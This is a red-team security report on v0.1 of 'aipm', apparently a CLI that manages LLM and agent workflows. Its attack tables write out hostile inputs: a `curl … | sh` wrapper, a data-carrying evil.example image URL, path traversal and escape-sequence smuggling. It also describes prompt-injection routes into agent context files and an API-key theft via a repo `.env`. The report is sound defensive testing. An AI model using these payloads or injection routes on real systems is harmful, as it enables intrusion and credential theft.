| | |
|---|---|
| Milestone | v0.1, the PM core (ARCHITECTURE §22) |
| Branch | `security/redteam-v0.1` |
| Date | 2026-10-29 |
| Prompt | [09-security-red-team.md](../../prompts/09-security-red-team.md) |

## 1. Scope

Everything v0.1 ships: `init`, `doctor`, `trust`, `discover`, `approve`, `design`, `plan`, `status`, `prompt`, `sync-context` and bare `aipm`; the LLM gateway with both providers; the state store; the trust store; the `python-uv` stack; and the security primitives in `aipm.security`, `aipm.execution`, `aipm.state` and `aipm.observability`.

The attacker controls any combination of `idea.md`, every file in the target repository (including a cloned repo's `.pm/` and `.git/`), every LLM response, agent output and diffs, test and scanner output, and registry metadata. The attacker does not control the user's terminal input, the user-level config or aipm's installed code.

v0.1 neither dispatches agents nor runs gates, so the dispatch, sandbox, worktree, scheduler and verify paths (v0.2 and v0.3) are out of scope. They are attacked in the v0.2 and v0.3 passes.

## 2. Attack surface

### 2.1 Where T2 data enters

| Entry | Read by | Becomes |
|---|---|---|
| `idea.md`, `--from FILE`, `--answers FILE`, `--report FILE` | `app/inputs.py` (`read_repo_file`), `app/discover.py`, `app/prompt.py` | LLM prompts (wrapped), `.pm/` artifacts, task prompts |
| Repository file names and the README heading | `app/repo_map.py` | `.pm/repo-map.md`, then LLM prompts |
| `.pm/*` artifacts, including a cloned repo's `approvals.yaml` and `tasks.yaml` | `state/store.py`, `app/snapshot.py` | phase, prompts, context files, status |
| `.pm/config.yaml` | `config/loader.py` | the merged config, the execution surface, context files |
| The environment (`AIPM_*`, `AIPM_CONFIG`), which tools such as pipenv fill from a repo `.env` | `config/loader.py` | the merged config |
| `.git/config`, `.git/config.worktree` and includes (repos copied from a tarball) | git, through `execution/git.py` | `HEAD` for `base_sha` |
| `AGENTS.md` and `CLAUDE.md` outside the managed block | `context/managed_block.py` | kept byte for byte |
| LLM responses | `llm/gateway.py`, `llm/structured.py`, the roles | `.pm/` artifacts, the repair prompt, terminal output |
| Provider error messages and headers (`retry-after`) | `llm/providers/*` | errors on the terminal, retry delays |
| Tool output (`--version`), executables found on `PATH` | `app/doctor.py`, `adapters/claude_code.py`, `execution/clipboard.py`, `execution/git.py` | the terminal, process launches |

### 2.2 Where aipm executes, writes, prints or decides

- **Executes** (`execution/process.py` only): `git rev-parse` (`prompt`), `pbcopy`/`wl-copy`/`xclip` (`prompt --copy`), `<tool> --version` (`doctor`, Claude Code detection). Gate argv is not executed in v0.1, but it is handed to the user's agent through `AGENTS.md` and task prompts, which the agent runs outside any sandbox.
- **Writes:** `.pm/` (store, events, lock, prompts, ADRs), the managed blocks of `AGENTS.md` and `CLAUDE.md`, `prompt --out FILE`, the trust store and the log file in the user state directory.
- **Prints:** every command's terminal output and `--json` envelope, questionary prompts, log lines on stderr.
- **Decides:** key classes when merging config layers, the execution surface hash and trust, the command policy, path validation, phase derivation from approvals, task readiness (`depends_on` and `status`), the token budget, and injection-signal events.

### 2.3 Compared with SECURITY.md §13.1

Every entry above maps to an existing threat except one, which was added:

- **T-7** (new): repository content becomes configuration through the environment. A repo `.env` loaded by pipenv (or direnv, mise or an editor set up to do so) sets `AIPM_LLM__BASE_URL` and `AIPM_LLM__API_KEY_ENV`, or `AIPM_CONFIG=.pm/user.yaml`. Fixed as RT01-2; the rest is residual risk R-8.

Two existing threats got a sharper example: E-1 (a wrapper such as `time bash -c …` in a trusted-looking gate, RT01-1) and I-2 (a secret split by an escape sequence in a log line, RT01-4).

## 3. Attacks tried

Result: **Bypassed** means the attack worked before this pass and is now fixed (section 4). **Held** means the existing controls stopped it. **By design** and **Not reachable** are explained in the row.

### I-1: no process starts with an argv outside the trusted menu or fixed fragments

| # | Technique | Result |
|---|---|---|
| 1 | A wrapper in front of a hard-denied program: `time bash -c`, `nice sh -c`, `timeout 5 zsh -c`, `command bash`, `caffeinate -i bash`, `arch -arm64 bash`, `script -q /dev/null sh`, `stdbuf -o0 curl`, `sandbox-exec -p … bash`, `find . -exec sh -c`, `setsid`, `watch`, `flock`, `chroot`, `npm test -- rm` (C-028) | **Bypassed**, RT01-1 |
| 2 | Inline code through interpreters the policy did not know: `osascript -e 'do shell script …'`, `php -r`, `lua -e`, `Rscript -e`, `julia -E` (C-029) | **Bypassed**, RT01-1 |
| 3 | Invisible characters in argv to make the trust display lie: Hangul filler U+3164, U+115F, U+FFA0, CGJ U+034F, Khmer U+17B4, Mongolian U+180B | **Bypassed**, RT01-5 |
| 4 | Program-name spellings: `/bin/BASH`, `/usr/bin/Git`, `python3.13t`, `pypy3`, `perl5.36`, `pip3.12`; flag clusters `-Bc`, `-cprint(1)`, `-mpip`, `-Impip`, `--eval=1`, `--import=data:` | Held |
| 5 | Placeholder smuggling: `{path}`, `--x={paths}`, path values `-rf`, `@co.txt`, `../etc/passwd`, `/etc/passwd`, `.pm/tasks.yaml`, `src/.env`, `bash`, `src/git` | Held |
| 6 | Fetch-and-run spelled as a subcommand: `uv tool uvx`, `uv tool run`, `npm x --`, `pnpm dlx`, `yarn dlx`, `bun x` | Held |
| 7 | A `git` or `pbcopy` first on a `PATH` with a repo-local entry | Held: refused when found inside the repository |
| 8 | `.git/config` from a tarball: `core.fsmonitor`, `core.hooksPath`, `core.pager`, `include.path` and `includeIf` naming a script | Held: `-c` options override the repo config, and `rev-parse` runs no hook. New regression test. |
| 9 | Process tricks: a child that starts its own session, a leader that ignores SIGTERM, background children, 3 MB on stdout or on stderr alone | Held, except the documented escape of a new-session child (contained by the v0.2 sandbox). New stderr regression test. |
| 10 | `trust` time-of-check: change `.pm/config.yaml` between `aipm trust --show` and the interactive yes, or `--confirm` with a 12-character prefix shared by a crafted surface | Held: the full hash is compared again under the new config; `--confirm` must match the current surface |

### I-2: aipm writes only inside `.pm/`, its managed blocks and its own directories

| # | Technique | Result |
|---|---|---|
| 1 | `.pm/` itself, `.pm/prompts/`, `.pm/adr/`, `.pm/.lock` or `.pm/events.jsonl` as a symlink to a directory or file outside the repo | Held: `lstat` checks and `O_NOFOLLOW`, exit 6 |
| 2 | `AGENTS.md` or `CLAUDE.md` as a symlink, a FIFO, or under a symlinked directory | Held: `repo_files.py` refuses links and non-regular files |
| 3 | `prompt --out` to `.github/x`, `CLAUDE.md`, an extra protected path, a path outside the repo, or a link | Held: `safe_relpath` and `write_repo_bytes` |
| 4 | `.PM/` instead of `.pm/` on a case-insensitive file system | Held: it is the same directory, and protected-path checks casefold |
| 5 | `.pm/.lock` or `events.jsonl` as a hard link to a file outside the repo (the lock is truncated, events are appended) | Not reachable from T2: git cannot store hard links, so only a process on the machine could plant one (a non-goal). Recommendation 4. |
| 6 | Swap a checked file for a symlink between check and use (TOCTOU) | Not reachable from T2 for the same reason; writes are atomic replaces and never follow the final link |

### I-3: context files hold no foreign URL, no HTML comment and no invisible Unicode

| # | Technique | Result |
|---|---|---|
| 1 | A URL without slashes, which browsers and Markdown viewers resolve: `![s](https:evil.example/p.png?d=…)`, `http:evil.example` (C-031) | **Bypassed**, RT01-3 |
| 2 | Default-ignorable letters that render as nothing, splitting keywords: `c\u3164url`, `s\uffa0h` (C-032) | **Bypassed**, RT01-5 |
| 3 | URL tricks: userinfo (`docs.python.org@evil`), suffix (`docs.python.org.evil`), punycode, a Cyrillic host, `//host`, backslashes, a fullwidth colon, `www.` | Held |
| 4 | Untrusted-block boundary: a fake `</untrusted id="…">` with the content-derived nonce computed for the block (no fixed point exists, and the tag is neutralized anyway), `<\u200b/untrusted`, a fullwidth `＜/untrusted` | Held |
| 5 | Template and Markdown syntax in model text: `{{ 7*7 }}`, `{% raw %}`, backtick and tilde fences of any length, aipm markers inside a field | Held: fields are data, never templates; fences outgrow their content; `<!--` never reaches a block. Fuzzed. |
| 6 | `@` imports with unusual lead characters: `(@.env`, NBSP before `@`, `@@x`, `@https://…` | Held |
| 7 | Hostile instructions in the user-owned part of `AGENTS.md` or `CLAUDE.md`, outside the markers | By design: aipm keeps that text byte for byte, and a repository can put the same text in any file an agent reads. Recommendation 3. |

### I-4: no task becomes `done` without every required gate passing on its diff

| # | Technique | Result |
|---|---|---|
| 1 | Make aipm mark a task done (agent self-report, `AIPM-DONE`, a crafted gate report through `prompt --fix --report`) | Held: nothing in v0.1 sets `done`; `--report` only feeds failure output into a prompt |
| 2 | Prompt for a task that is `done`, `skipped` or `blocked` | Held: exit 2 |
| 3 | A cloned repo ships `tasks.yaml` with `status: done` and a `done` record for upstream tasks | By design for v0.1: progress is a record outside the G3 hash (ADR-0016), so dependent tasks become ready without `--force` and `status` counts them done. Nothing runs. Recommendation 2 for v0.2. |

### I-5: no registered test secret reaches an LLM request, a file, a log or a run artifact

| # | Technique | Result |
|---|---|---|
| 1 | A secret split by an escape sequence or a control character in a log record: message, arguments or traceback (C-034) | **Bypassed**, RT01-4 |
| 2 | Secret files with case variants through `--from`, `--answers` and `--report`: `Secrets.yaml`, `server.PEM`, `AWS_Credentials.json`, `ID_RSA`, `.NETRC`, `deploy.KEY` (C-033) | **Bypassed**, RT01-6 |
| 3 | A secret split by zero-width characters, or written with a canonically equivalent character, in prompts and `.pm/` writes | Held: text is sanitized before it is redacted |
| 4 | Base64 and percent-encoded environment secrets in a write | Held: the pre-write scan refuses (exit 6) |
| 5 | Repo `security.extra_redact_patterns` that hang (ReDoS) or erase aipm's own rules from prompts | Held: only the user's patterns are applied |
| 6 | The repair prompt echoing the model's invalid output (and anything it smuggled) | Held: problems name fields and rules only; invented keys are masked |

### I-6: terminal output holds no ESC or OSC sequence from T2

| # | Technique | Result |
|---|---|---|
| 1 | OSC 8 links, OSC 52 clipboard writes, CSI and DCS in task titles, PRD fields, provider error messages and YAML errors | Held: `print_untrusted` and the error path sanitize |
| 2 | C1 introducers (U+009B CSI), unterminated OSC strings | Held |
| 3 | Escapes in log lines, including arguments and tracebacks | Held, and stronger after RT01-4: arguments are now folded into the message before the escapes are stripped |
| 4 | Escapes in `--json` output and questionary choices | Held: `ensure_ascii`, `label()` |

### I-7 and I-8: repo config cannot relax security or set user-only keys; `--yes` never writes trust

| # | Technique | Result |
|---|---|---|
| 1 | A repository `.env` loaded by pipenv sets `AIPM_LLM__BASE_URL`, `AIPM_LLM__API_KEY_ENV`, `pass_env`, `allow_auto_mode`, `extra_allowed_executables`, `llm.pricing`, or `AIPM_CONFIG=.pm/user-config.yaml` (C-030) | **Bypassed**, RT01-2 |
| 2 | Repo config relaxations through YAML merge keys (`<<:`), duplicate keys, anchors and aliases, tags, case variants of keys, a new `dispatch.tools.codex` entry with `bare: false` | Held |
| 3 | `--yes` on `init`, `trust`, `discover`, `approve prd`, `approve plan`, `plan`, `sync-context` | Held (existing integration tests) |
| 4 | Forged `approvals.yaml` for G1, G2, G3 and context blocks in a cloned repo | By design: approvals drive the phase and let `sync-context` write approved blocks, but never grant trust; the attacker could commit the same `AGENTS.md` directly. Recommendation 5. |

## 4. Findings

| ID | Severity | Invariant | Finding | Fix |
|---|---|---|---|---|
| RT01-1 | Medium | I-1 | The command policy checked hard-denied programs only as `argv[0]` and after a runner. With a repo-ok `allowed_executables: [[time]]`, the gate `time bash -c "curl … \| sh"` passed the policy, and so did `osascript -e`. `aipm trust` still showed the full argv, so a user had to approve it, but the "cannot be allowed by any configuration" guarantee did not hold. | `2710684`: hard-denied names refused at any argv position; five more interpreters with inline-code flags (ADR-0019) |
| RT01-2 | Medium | I-8, SG-6 | The loader let `AIPM_*` variables set user-only keys, and accepted any `AIPM_CONFIG`. A repository `.env` loaded by pipenv could set `llm.base_url` and `llm.api_key_env` and receive the user's API key with the repository content on the first `aipm discover`, or point `AIPM_CONFIG` at a repository file. | `2710684`: user-only keys from the environment ignored with a warning; `AIPM_CONFIG` must be absolute and outside the repository (ADR-0018) |
| RT01-3 | Low | I-3 | `sanitize_for_context` required `//` after `http:` and `https:`. `https:evil.example/x`, which Markdown viewers and browsers resolve, survived into `AGENTS.md` and task prompts (inside fenced untrusted blocks, where it is not rendered). | `2710684`: `http:` and `https:` without slashes always removed |
| RT01-4 | Low | I-5 | The logging pipeline redacted before it stripped escape sequences, so a secret split by `\x1b[0m` or `\x07` (as coloured tool output produces) passed redaction and was reassembled in the log file and on stderr. | `2710684`: escapes stripped first, with arguments and tracebacks folded in before redaction |
| RT01-5 | Low | I-3, I-1 | Default-ignorable code points outside the format category (Hangul fillers, Khmer U+17B4/U+17B5, Mongolian free variation selectors, U+034F, and unassigned default-ignorable ranges) survived L1, and were accepted in paths and argv. They render as nothing, so they can split keywords past a reviewer or make two argv look the same in `aipm trust`. | `2710684`: removed as zero-width (an injection signal) and refused in paths and argv |
| RT01-6 | Low | I-5 | The built-in deny list was matched case-sensitively, so on macOS `Secrets.yaml`, `server.PEM`, `.NETRC` and `deploy.KEY` were read through `--from`, `--answers` and `--report`, and listed in the repo map. | `2710684`: the deny list matches the casefolded path; `.gitignore` and `.aipmignore` keep git semantics |

## 5. Fuzzing

`tests/property/test_redteam_v01_props.py` adds seven properties. `uv run pytest tests/property --hypothesis-profile=ci-long` runs each at least 2,000 times; the profile is registered in `tests/conftest.py`. All passed at 2,000 examples.

| Target | Property |
|---|---|
| Path validators | An accepted glob matches no root protected path in any case or confusable spelling; an accepted path is never protected at any depth; neither holds a control, format or default-ignorable character |
| Command policy | An accepted argv (wrappers and interpreters at the head, hard-denied names and inline flags anywhere) holds no hard-denied program and no inline-code flag after an interpreter |
| Sanitizer | Sanitized text holds no invisible character; context-cleaned text holds no `http:` or `https:`, is idempotent and passes invariant I-3 |
| Managed blocks | Hostile fields (markers, fences, fake untrusted tags, `@` imports, Jinja syntax, escapes) give an `AGENTS.md` block that passes I-3 and round-trips through `replace_block` in a hostile document, or is refused |
| Schema loaders | YAML with anchors, aliases, tags, merge keys, duplicate keys and odd scalars loads to plain data or exits 2 |
| Config layers | For random user, repo and environment layers, the result never holds a user-only key the user did not set and is never looser than the user config on any tighten-only key |

The fuzzing found no new problem in aipm. One oracle was wrong at first (it treated unassigned code points, which L1 keeps by design, as invisible) and was corrected.

## 6. Residual risks

SECURITY.md §15 gains two entries:

- **R-8**: `AIPM_*` variables may still relax tighten-only keys, and a tool that loads a repository's `.env` hands that power to the repository. Each relaxation is printed on every run. Closing this changes behaviour an existing test pins (`test_environment_values_are_parsed_as_yaml_scalars`), so it is the owner's decision (ADR-0018).
- **R-9**: trust covers the argv, not the code it loads. `pytest` imports `conftest.py`, and a repo-relative executable can change after `git pull` without changing the surface hash.

The others (R-1 to R-7) are unchanged.

## 7. Recommendations for v0.2

1. **Decide R-8.** Either keep `AIPM_*` relaxations (and document them as the user's own per-shell override), or limit the environment like the repository layer and update the pinned test.
2. **Back `done` with a local record.** When `verify` arrives, a task should count as done only if this machine's run journal (gitignored) holds the passing gate results for its diff. A `done` record in a cloned `tasks.yaml` should show as "claimed by the repository".
3. **Warn about the user-owned part of context files.** `sync-context` could flag `@` imports of paths outside the repository or on the deny list, HTML comments and invisible characters outside the managed block of `CLAUDE.md` and `AGENTS.md`, which Claude Code reads as instructions.
4. **Refuse hard-linked state files.** `.pm/.lock` is truncated and `events.jsonl` appended to; refusing files with more than one link costs one `fstat`.
5. **Word approval labels as records.** Prompts say a plan was "approved by a human"; for a cloned repository that approval may be the repository's own. "Recorded as approved in `.pm/approvals.yaml`" says the same without overstating it.
6. **Run `ci-long` in CI**, for example nightly in `security.yml`, so the fuzzing keeps its 2,000 examples per property.
7. **Attack the new surfaces first** in the v0.2 pass: the gate runner and `{report_file}`, the sandbox profiles, post-change checks (tamper heuristics, protected paths on the real diff, git integrity snapshots) and the registry lookups.
